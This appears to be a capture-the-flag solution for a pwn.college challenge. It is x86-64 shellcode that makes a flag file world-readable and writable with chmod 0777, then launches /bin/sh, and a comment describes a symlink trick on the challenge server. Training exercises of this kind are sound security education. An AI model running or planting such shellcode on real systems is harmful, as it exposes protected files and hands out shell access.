.global _start
_start:
.intel_syntax noprefix

	mov rax, 90
	lea rdi, [rip+flagfile]
	mov rsi, 0x1ff
	syscall
	mov rax, 59
	lea rdi, [rip+binsh]
	mov rsi, 0
	mov rdx, 0
	syscall
binsh:	
	.string "/bin/sh"
flagfile:
	.string "./flag" #in pwncollege server change ./flag to use symlink to ../../flag -> ./a
